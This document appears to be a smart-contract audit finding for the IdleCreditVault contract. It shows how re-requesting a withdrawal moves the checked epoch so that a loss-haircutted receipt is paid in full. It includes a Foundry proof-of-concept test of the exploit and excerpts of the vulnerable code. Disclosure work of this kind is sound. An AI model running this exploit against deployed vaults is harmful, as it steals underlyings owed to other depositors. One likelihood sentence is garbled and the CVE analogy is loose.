### Title
Re-requesting a withdraw after a loss-adjusted epoch moves `lastWithdrawRequest` and lets the haircutted receipt be claimed at par via `_claimFundedWithdrawRequest` - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
CVE-2024-32021 is a TOCTOU bug: Git checks that a source object is a real file, then hardlinks it after the check is bypassed — the validation and the use operate on different states. The analog in `IdleCreditVault` is the split between *which epoch is checked for a loss haircut* and *which receipts are actually paid out*. `_claimLossAdjustedWithdrawRequest` only looks up `lossRecoveryPriceByEpoch[lastWithdrawRequest[_user]]`, while `_claimFundedWithdrawRequest` pays the aggregate `withdrawsRequests[_user]` at par. An attacker who had a receipt in a loss epoch and then submits a new `requestWithdraw` moves `lastWithdrawRequest` to a later, non-loss epoch, so the loss-adjusted path short-circuits and the old haircutted receipt is paid in full — a "check then act on stale/changed state" escape that breaks loss socialization and drains vault underlyings.

### Finding Description
When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` pulls only `pendingToFund` (less than `pendingWithdraws`) and records `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis`, then zeroes `pendingWithdraws` [1](#0-0) . The unfunded haircut portion is never transferred to the vault; it is only enforced at claim time by `_claimLossAdjustedWithdrawRequest`, which pays `claimBasis * lossRecoveryPrice / RECOVERY_FULL` [2](#0-1) .

However, that lookup is keyed solely on `lastWithdrawRequest[_user]` [3](#0-2) . A later `requestWithdraw` in a healthy epoch M overwrites `lastWithdrawRequest[_user] = M` and adds `withdrawsRequestsByEpoch[_user][M]` while leaving `withdrawsRequestsByEpoch[_user][N]` and the aggregate `withdrawsRequests[_user]` intact [4](#0-3) . On claim, `lossRecoveryPriceByEpoch[M] == 0` so `_claimLossAdjustedWithdrawRequest` returns early without clearing epoch N's receipt [5](#0-4) , and `_claimFundedWithdrawRequest` then burns and pays `withdrawsRequests[_user]` — which still includes the epoch-N basis — at par through `_transferFundedClaim` [6](#0-5) .

### Impact Explanation
Broken invariant: loss waterfall / "one receipt one payout at the recorded haircut". The haircut portion `amount_N * (1 - lossRecoveryPrice)` was deliberately never funded by the borrower, yet the attacker redeems it anyway. The payout is sourced from the vault's held underlyings — funded receipts, reserves, or other users' claims — so each exploit directly steals `amount_N * (1 - lossRecoveryPrice)` from honest claimants or renders them underfunded (insolvency at claim time). With a 50% recovery price and a 1000-underlying receipt, re-requesting a dust withdraw in the next epoch converts a 500-underlying loss into a full 1000 payout.

### Likelihood Explanation
Attacker needs only to be a tranche-token holder (in scope: a KYC-passing lender or any holder after `_transferBurnedTrancheTokens`-style receipt movement is not required since receipts are minted to the user). Prerequisites: an epoch ends via `stopEpochWithDuration`/`collectWithdrawFunds` with `_amount < pendingBasis` while the attacker has a pending receipt — a normal, honest-manager loss event. After that the exploit is purely attacker-initiated (`requestWithdraw`, wait one epoch, `claimWithdrawRequest`). No guard stops it: `_claimFundedWithdrawRequest`'s `epochNumber <= lastWithdrawRequest` check passes once epoch M ends, `_settleApr0` is unaffected, and `_transferFundedClaim`'s reserve guard only protects `defaultRecoveryReserve`, not the general balance [7](#0-6) [8](#0-7) .

### Recommendation
Do not key the loss-adjusted claim solely on `lastWithdrawRequest`. Iterate (or track) all epochs in `withdrawsRequestsByEpoch[_user]` that have a non-zero `lossRecoveryPriceByEpoch` and clear/pay them at their haircut before the funded path, or store per-epoch loss status. At minimum, in `_claimFundedWithdrawRequest`, exclude any epoch whose `lossRecoveryPriceByEpoch != 0` from the par payout, or revert/force settlement of outstanding loss-adjusted receipts inside `requestWithdraw` before allowing a new request to overwrite `lastWithdrawRequest`.

Foundry fork PoC (mirroring `test/foundry/IdleCreditVault.t.sol` helpers):

```solidity
function testLossHaircutEscapedByReRequest() external {
    // user deposits and starts epoch 0
    uint256 amount = 10000 * ONE_SCALE;
    uint256 minted = idleCDO.depositAA(amount);
    _startEpochAndCheckPrices(0);

    // attacker requests withdraw in epoch that will take a loss
    uint256 reqN = cdoEpoch.requestWithdraw(minted / 2, address(AAtranche));

    vm.warp(cdoEpoch.epochEndDate() + 1);
    // honest manager stops epoch with a loss: borrower funds only half of pendingWithdraws
    uint256 pendingBasis = IdleCreditVault(address(strategy)).pendingWithdraws();
    uint256 lossAmount = pendingBasis / 2; // 50% haircut on pending receipts
    (uint256 pendingToFund, ) = IdleCreditVault(address(strategy))
        .previewLossAdjustedWithdrawFunds(lossAmount);
    deal(defaultUnderlying, borrower, pendingToFund + amount, true);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(0, 0, cdoEpoch.epochDuration(), lossAmount);
    // epoch N (current epochNumber) now has lossRecoveryPriceByEpoch[N] ~ 0.5

    // attacker does NOT claim the haircutted receipt; instead re-requests in epoch M
    vm.prank(manager);
    cdoEpoch.startEpoch();
    cdoEpoch.requestWithdraw(minted / 4, address(AAtranche)); // sets lastWithdrawRequest = M
    vm.warp(cdoEpoch.epochEndDate() + 1);
    // fully funded normal stop
    uint256 pending2 = IdleCreditVault(address(strategy)).pendingWithdraws();
    deal(defaultUnderlying, borrower, pending2 + amount, true);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    // claim: loss path sees lossRecoveryPriceByEpoch[M]==0 and returns early;
    // funded path pays aggregate reqN + reqM at par
    uint256 balPre = underlying.balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(address(this)) - balPre;

    // paid == reqN + reqM, but reqN was only funded at ~50%:
    // attacker received reqN * (1 - recoveryPrice) of unfunded underlyings
    assertGt(paid, reqN / 2 + (minted / 4), "haircut bypassed");
}
```

```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
```

```text
  function _transferFundedClaim(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    uint256 reserve = defaultRecoveryReserve;
    if (reserve != 0) {
      uint256 balance = underlyingToken.balanceOf(address(this));
      // This should be unreachable when accounting is consistent. Keep the guard so old funded
      // receipts can never spend underlyings reserved for default recovery claimants.
      if (balance < reserve || balance - reserve < _amount) revert NotAllowed();
    }
    underlyingToken.safeTransfer(_user, _amount);
```
